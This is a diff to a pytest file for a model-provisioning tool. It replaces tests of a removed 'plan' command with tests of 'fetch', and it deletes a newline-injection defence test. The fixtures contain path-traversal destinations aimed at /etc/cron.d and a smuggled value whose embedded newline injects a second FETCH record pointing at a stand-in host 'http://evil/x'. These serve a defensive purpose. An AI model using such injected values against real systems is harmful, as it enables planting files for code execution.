@@ -11,7 +11,6 @@ from isekai.boundary.provision import (
     digest_of,
     fetch,
     land,
-    plan,
     verify,
 )
 from tests.fakes import FakeFetcher
@@ -233,15 +232,10 @@ def test_a_source_rejected_before_transfer_is_absent_from_the_offered_sources(
 @pytest.mark.spec(
     "model-provisioning:source-fallback:the-plan-carries-every-surviving-source"
 )
-def test_the_plan_line_carries_the_whole_ordered_source_list(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
-) -> None:
-    entry = _entry()
-    assert plan(_manifest([entry]), tmp_path, FakeFetcher()) == 0
-    target = tmp_path / entry["dest"]
-    assert capsys.readouterr().out.splitlines() == [
-        f"FETCH\t{target}\t{PRIMARY}\t{ALTERNATE}"
-    ]
+def test_fetch_walks_every_surviving_source_in_manifest_order(tmp_path: Path) -> None:
+    fetcher = FakeFetcher()
+    assert fetch(_manifest([_entry()]), tmp_path, fetcher) == 1
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY, ALTERNATE]
 
 
 @pytest.mark.spec(
@@ -306,31 +300,6 @@ def test_fetch_moves_no_byte_when_any_entry_aborts(tmp_path: Path) -> None:
     assert placed.read_bytes() == b"somebody else's bytes"
 
 
-@pytest.mark.spec_exempt("structural: the CLI surface the shell driver calls")
-def test_plan_reports_a_present_and_verified_entry_as_a_skip(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
-) -> None:
-    entry = _entry()
-    _place(tmp_path, entry, PAYLOAD)
-    manifest = _manifest([entry])
-    assert plan(manifest, tmp_path, FakeFetcher()) == 0
-    target = tmp_path / entry["dest"]
-    assert capsys.readouterr().out.splitlines() == [f"SKIP\t{target}"]
-
-
-@pytest.mark.spec_exempt("structural: the CLI surface the shell driver calls")
-def test_plan_exits_non_zero_before_emitting_any_transfer_when_an_entry_aborts(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
-) -> None:
-    bad = _entry()
-    _place(tmp_path, bad, b"somebody else's bytes")
-    absent: Entry = {**_entry(), "dest": "controlnet/other.onnx"}
-    assert plan(_manifest([bad, absent]), tmp_path, FakeFetcher()) == 1
-    captured = capsys.readouterr()
-    assert "FETCH" not in captured.out
-    assert bad["dest"] in captured.err
-
-
 ESCAPES = "../../etc/cron.d/payload"
 ABSOLUTE = "/etc/cron.d/payload"
 
@@ -371,13 +340,14 @@ def test_an_escaping_destination_is_refused_before_the_pre_flight(
 @pytest.mark.spec(
     "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
 )
-def test_the_plan_line_carries_the_already_resolved_destination(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+def test_the_transfer_writes_beside_the_already_resolved_destination(
+    tmp_path: Path,
 ) -> None:
     entry = _entry([PRIMARY])
-    assert plan(_manifest([entry]), tmp_path, FakeFetcher()) == 0
+    fetcher = FakeFetcher(served={PRIMARY: PAYLOAD})
+    assert fetch(_manifest([entry]), tmp_path, fetcher) == 0
     target = tmp_path / entry["dest"]
-    assert capsys.readouterr().out.splitlines() == [f"FETCH\t{target}\t{PRIMARY}"]
+    assert fetcher.fetched == [(PRIMARY, target.with_name(f"{target.name}.partial"))]
 
 
 MALFORMED = [
@@ -444,10 +414,8 @@ def test_a_destination_resolving_to_the_models_root_itself_is_refused(
         assert dest in decision.reason
 
 
-# The plan protocol is line- and tab-delimited, so a destination carrying either
-# does not stay one field: this one ends the record and starts a second whose
-# target is absolute and whose URL never passes `PINNED_SOURCE`, because that
-# check lives in `decide` and an injected record bypasses `decide` entirely.
+# A destination carrying a newline smuggles a second, absolute path past the
+# containment rule if anything splits on lines.
 SMUGGLED = "checkpoints/a.safetensors\nFETCH\t/etc/cron.d/payload\thttp://evil/x"
 
 
@@ -458,19 +426,3 @@ def test_a_destination_carrying_whitespace_is_refused(tmp_path: Path) -> None:
     decision = decide({**_entry(), "dest": SMUGGLED}, tmp_path, FakeFetcher())
     assert decision.action == "abort"
     assert "does not resolve" in decision.reason
-
-
-@pytest.mark.spec(
-    "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
-)
-def test_a_plan_line_that_would_not_stay_one_record_is_refused(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
-) -> None:
-    # Defence in depth, against the half of the target the destination rule does
-    # not cover: `MODELS_DIR` is handed in by the shell, so the delimiter can
-    # arrive from the root rather than from the manifest.
-    models_dir = tmp_path / "models\nroot"
-    assert plan(_manifest([_entry([PRIMARY])]), models_dir, FakeFetcher()) == 1
-    captured = capsys.readouterr()
-    assert "FETCH" not in captured.out
-    assert "ERROR" in captured.err
